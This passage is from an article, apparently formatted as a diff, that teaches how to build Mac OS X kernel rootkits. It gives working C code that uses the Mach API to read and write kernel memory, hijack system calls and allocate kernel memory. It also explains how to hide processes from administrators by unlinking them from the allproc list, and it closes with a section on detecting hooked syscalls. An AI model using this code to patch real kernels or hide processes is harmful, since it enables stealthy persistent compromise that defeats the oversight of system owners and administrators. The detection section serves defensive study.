+Instead of using a rogue kernel module (kext) to hijack syscalls the Mach
+API's can be used for runtime kernel patching. This is nothing new to the
+rootkit community, and has previously been used in rootkits such as SucKIT
+by sd [7] and phalanx by rebel [8], two very impressive rootkits for
+Linux.
+
+To access kernel memory on Linux both SucKIT and phalanx uses /dev/kmem
+(and later /dev/mem). /dev/kmem and /dev/mem has been removed from Mac OS
+X as of version 10.4. The Mach-subsystem does however provide a very
+useful set of memory manipulation functions. The functions of interest for
+a rootkit developer are vm_read(), vm_write() and vm_allocate(). These
+functions allows arbitrary read and write access to the entire kernel from
+userspace as well as allowing allocation of kernel memory. The only
+requirement is root access. 
+
+The vm_allocate() function in particular is of great value. A common
+technique used on other operating systems to allocate kernel memory is to
+replace a system call handler with the kmalloc() function, and then
+execute the syscall. This way an attacker is able to allocate memory in
+kernelspace needed to store the wrapper functions. The big downside of
+this approach is the race condition introduced in case some other userland
+process calls the same syscall. But since the friendly Apple kernel
+developers provided the vm_allocate() function this isn't necessary on Mac
+OS X.
+
+-[ 5.1 - System call hijacking
+
+The vm_read() and vm_write() functions can be used as great tools for
+syscall hijacking. First off the address of the sysentry table needs to be
+located. The process identified by Landon Fuller [1] works just as good
+from userspace as it does from kernelspace. The sysentry table contains
+pointers to all the syscall handler functions we want to hijack.
+
+To read the address to the handler function for a syscall, i.e. SYS_kill,
+we can use the vm_read() function, and passing it the address of the
+sy_call variable of SYS_kill.
+
+mach_port_t port;
+pointer_t buf; /* pointer to your result */
+unsigned int r_addr = (unsigned int)&_sysent[SYS_kill].sy_call; /* address to sy_call */
+unsigned int len = 4; /* number of bytes to read */
+unsigned int sys_kill_addr = 0; /* final destination */
+
+/* get a port to pid 0, the mach kernel */
+if (task_for_pid(mach_task_self(), 0, &port)) {
+   fprintf(stderr, "failed to get port\n");
+   exit(EXIT_FAILURE);
+}
+
+/* read len bytes from r_addr, return pointer to the data in &buf */
+if (vm_read(port, (vm_address_t)r_addr, (vm_size_t)len, &buf, &sz) != KERN_SUCCESS) {
+   fprintf(stderr, "could not read memory\n");
+   exit(EXIT_FAILURE);
+}
+
+/* do proper typecast */
+sys_kill_addr = *(unsigned int*)buf;
+
+The address to the SYS_kill handler is now available in the sys_kill_addr
+variable. Replacing a syscall handler is as simple as writing a new value
+to the same location using the vm_write() function. In the example below
+we replace the SYS_setuid system call handler with the handler for
+SYS_exit, which will result in the termination of any program that calls
+SYS_setuid.
+
+SYSENT *_sysent = get_sysent_from_mem();
+mach_port_t port;
+pointer_t buf;
+unsigned int r_addr = (unsigned int)&_sysent[SYS_exit].sy_call; /* address to sy_call */
+unsigned int len = 4; /* number of bytes to read */
+unsigned int sys_exit_addr = 0; /* final destination */
+unsigned int sz, addr;
+
+/* get a port to pid 0, the mach kernel */
+if (task_for_pid(mach_task_self(), 0, &port)) {
+        fprintf(stderr, "failed to get port\n");
+	exit(EXIT_FAILURE);
+}
+
+/* read len bytes from r_addr, return pointer to the data in &buf */
+if (vm_read(port, (vm_address_t)r_addr, (vm_size_t)len, &buf, &sz) != KERN_SUCCESS) {
+        fprintf(stderr, "could not read memory\n");
+	exit(EXIT_FAILURE);
+}
+
+/* do proper typecast */
+sys_exit_addr = *(unsigned int*)buf;
+
+/* address to system call handler pointer of SYS_setuid */
+addr = (unsigned int)&_sysent[SYS_setuid].sy_call;
+
+/* replace SYS_setuids handler with the handler of SYS_exit */
+if (vm_write(port, (vm_address_t)addr, (vm_address_t)&sys_exit_addr, 
+                      sizeof(sys_exit_addr))) {
+   fprintf(stderr, "could not write memory\n");
+   exit(EXIT_FAILURE);
+}
+
+Now if any program calls setuid(), it will be redirected to the system
+call handler of SYS_exit, and end gracefully. The same thing that can be
+done using a kernel extension can also be accomplished using the Mach API.
+
+In order to actually create a wrapper or completely replace a function
+some kernel memory is needed to store the new code. Below is a simple
+example of how to allocate 4096 bytes of kernel memory using the Mach API.
+
+vm_address_t buf; /* pointer to our newly allocated memory */
+mach_port_t port; /* a mach port is a communication channel between threads */
+
+/* get a port to pid 0, the mach kernel */
+if (task_for_pid(mach_task_self(), 0, &port)) {
+   fprintf(stderr, "failed to get port\n");
+   exit(EXIT_FAILURE);
+}
+
+/* allocate memory and return the pointer to &buf */
+if (vm_allocate(port, &buf, 4096, TRUE)) {
+   fprintf(stderr, "could not allocate memory\n");
+   exit(EXIT_FAILURE);
+}
+
+If everything went as planned we now have 4096 bytes of fresh kernel
+memory at our disposal, accessible via buf. This memory can be used as a
+place to store our syscall hooks
+
+-[ 5.2 - Direct Kernel Object Manipulation
+
+It is not just system calls that can be hijacked using this technique, it
+also works just as good to manipulate various other objects in
+kernelspace.  A good example of such a object is the allproc structure,
+which is a list of proc structures of currently running processes on the
+system. This list is used by programs such as ps(1) and top(1) to get
+information about the running processes.
+
+So if you have processes you want to hide from a nosy administrator a nice
+way of doing so is by removing the process proc strcuture from the allproc
+list. This will make the process magically disappear from ps(1), top(1)
+and any other tools that uses the allproc structure as source of
+information.
+
+The allproc struct is, just as the nsysten variable, a exported symbol of
+the kernel. To get the address of the allproc structure in memory you may
+do something like this:
+
+# nm /mach_kernel | grep allproc
+0054280c S _allproc
+#
+
+Now that you have the address of the allproc structure (0x0054280c) all
+you need to do is to modify the list and remove the proc structure of
+the preferred process. As described in "Designing BSD Rootkits" [11] this
+is usually done iterating through the list with the LIST_FOREACH() macro
+and removing entries with the LIST_REMOVE() macro. Since we can't modify
+the memory directly we have to use a wrapper utilizing the vm_read() and
+vm_write() functions, which we also leave as an exercise for the reader
+to implement. :)
+
+--[ 6 - Detection
+
+Detecting kernel rootkits can be very difficult. Some well known rootkits
+leaves traces in the filesystem or open network sockets that can be used
+to identify them. But this is nothing every rootkit does and wont help you
+to spot unknown rootkits. 
+
+Keeping a known good list of the sysentry table and comparing that to the
+current state is another way to try to identify if syscalls have been
+modified. A popular workaround for that is to keep a shadow copy of the
+entire syscall table and modify the interupt-handler to the use the shadow
+table instead of the original one. This will leave the original sysentry
+table intact and anyone looking at it will find it unmodified even though
+all syscalls are still re-routed through the malicious functions. Another
+way is to replace the entire interrupt-handler as well as the sysentry
+table. 
+
+Rootkits that intercept syscalls and modify the contents can sometimes be
+found by the fact that the buffer used to return data has junk at the end.
+Rootkit developers could surely fix this problem, but they often don't.
+Other indications of mischief is that calls that only returns counters,
+for instance the number of running processes, systematically doesn't match
+the count of running processes when listed. 
+
+One way of finding hidden files is to write software that accesses the
+underlying filesystem directly and matches the files on disk with the
+output from the kernel. This requires writing filesystem software or
+finding a library for the specific filesystem used. The upside is that it
+is virtually impossible to intercept and modify calls to the raw device. 
+
+Rootkits that hide open ports can under some circumstances be detected by
+port-scanning, when more advanced rootkits often use port-knocking or
+other types out of band signaling to avoid opening ports. 
+
+Detecting rootkits is a cat and mouse game, and the only winning move is
+not to play. 
+
+-[ 6.1 - Detecting hooked system calls on Mac OS X
+
+Now that you know how to hook system calls, we are going to show you a
+simple, yet effective, way of detecting if your system has gotten any of
+it's system calls hijacked.
+
+We already know that we can get the location of the sysent array in
+memory by adding 32 bytes to the exported nsysent symbol. We also know
+that the nsysent symbol contains the actual number of syscalls available
+on Mac OS X, which is 427 (0x1ab) on 10.5.6.
+
+Now, if we want to check if the current sysent array has been compromised
+we need something to compare it with, something like the original table.
+On Mac OS X the kernel image is a uncompressed, universal (Leopard)
+macho-o binary named mach_kernel found in the root of the filesystem. If
+we take a closer look at the kernel image we get this:
+
+# otool -d /mach_kernel | grep -A 10 "ab 01"
+[...]
+0050a780	ab 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+0050a790	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+0050a7a0	00 00 00 00 94 cf 38 00 00 00 00 00 00 00 00 00 
+0050a7b0	01 00 00 00 00 00 00 00 01 00 00 00 6a 37 37 00
+#
+
+At 0050a780 we see the magic number 427 (0x000001ab), the number of
+available syscalls. If we look 32 bytes ahead we see the value 0x38cf94,
+can this be the start of the sysent array? I think it is!
+
+All we need to is to copy the kernel image to a buffer, find the offset to
+the nsysent symbol, add 32 bytes to the offset and return a pointer to
+that position and we have our original sysent array. All this can be done
+with the following C function.
+
+char *
+get_sysent_from_disk(void)
+{
+	char *p;
+	FILE *fp;
+
+	unsigned long sz;
+	int i;
+
+	fp = fopen("/mach_kernel", "r");
+	if (!fp) {
+		fprintf(stderr, "could not open file\n");
+		exit(-1);
+	}
+
+	fseek(fp, 0, SEEK_END);
+	sz = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+
+	buf = malloc(sz);
+	p = buf;
+
+	fread(buf, sz, 1, fp);
+	fclose(fp);
+
+	for (i = 0; i < sz; i++) {
+		if (*(unsigned int *)(p) == 0x000001ab &&
+			*(unsigned int *)(p + 4) == 0x00000000) {
+			return (p + 32);
+		}
+		p++;
+	}
+
+	return NULL; /* epic fail */
+}
+
+This function can later be used in a simple detector.
+
+struct sysent *_sysent_from_ram;
+struct sysent *_sysent_from_hdd;
+
+_sysent_from_ram = (struct sysent *)get_sysent_from_ram();
+_sysent_from_hdd = (struct sysent *)get_sysent_from_disk();
+
+for (i = 0; i < 428; i++) {
+	if (get_syscall_addr(i, _sysent_from_ram) != get_syscall_addr(i,
+	_sysent_from_hdd))
+		report_hooked_syscall(i);
+}
+
+Of course this method has it's flaws. An attacker may manipulate the
+SYS_open syscall and redirect the call to a rogue copy of the kernel image
+if the file /mach_kernel is accessed. This can be overcome by always
+keeping a fresh and clean copy of the kernel image on a non-writable
+media.
+
+This method is also not capable of detecting inline function hooks in the
+system call handler functions, that's a modification left as an exercise
+for the reader to implement.
+
+--[ 7 - Summary
+
+Rootkits on Mac OS X is not a new topic, but not as well researched as
+i.e. rootkits on Windows or Linux. As we have shown, the techniques used
+is quite similar to the ones used on other unix-like operating systems. In
+addition to this OS X has some extra goodies, like the I/O Kit framework
+and the Mach API, that provides really useful features for people trying
+to subvert the XNU kernel.
+
+Manipulating syscalls, internal kernel structures and other parts of the
+XNU kernel is a great way to hide processes, files and folders and even to
+place backdoors accessible directly from userland. All this can be
+achieved using either a kernel extension or the Mach API, and if done
+right almost impossible to detect. Both techniques have different
+advantages and it's up to you to choose which technique to use in your own
+rootkit.
+
+The purpose of this article was first and foremost to give a basic
+understanding of the subject and is intended as an entry level tutorial
+for anyone wishing to implement their own OS X kernel rootkit and we
+sincerely hope that it helped to shed some light on the subject.
+
+--[ 8 - References
+
+[1] Landon Fuller - Fixing ptrace(pt_deny_attach, ...) on Mac OS X 10.5 Leopard
+     http://landonf.bikemonkey.org/code/macosx/Leopard_PT_DENY_ATTACH.20080122.html
+
+[2] Apple Developer Connection
+     http://developer.apple.com
+
+[3] Apple - Darwin source code
+     http://opensource.apple.com/darwinsource/
+
+[4] Apple Kernel Programming guide
+     http://developer.apple.com/documentation/Darwin/Conceptual/KernelProgramming/keepout/keepout.html
+
+[5] nemo of felinemenace
+     http://felinemenace.org/~nemo/
+
+[6] I/O Kit Device Driver Design Guidelines: Kernel-User Notification
+     http://developer.apple.com/documentation/DeviceDrivers/Conceptual/WritingDeviceDriver/KernelUserNotification/KernelUserNotification.html
+
+[7] Linux on-the-fly kernel patching without LKM
+     https://phrack.org/issues/58/7.html#article
+
+[8] phalanx rootkit by rebel
+     http://packetstormsecurity.org/UNIX/penetration/rootkits/phalanx-b6.tar.bz2
+
+[9] WeaponX rootkit by nemo
+     http://packetstormsecurity.org/UNIX/penetration/rootkits/wX.tar.gz
+
+[10] logKext keylogger by drspringfield
+      http://code.google.com/p/logkext/
+
+[11] Designing BSD Rootkits by Joseph Kong
+      ISBN 1593271425
+
+--[ 9 - Code
+
+--------[ EOF
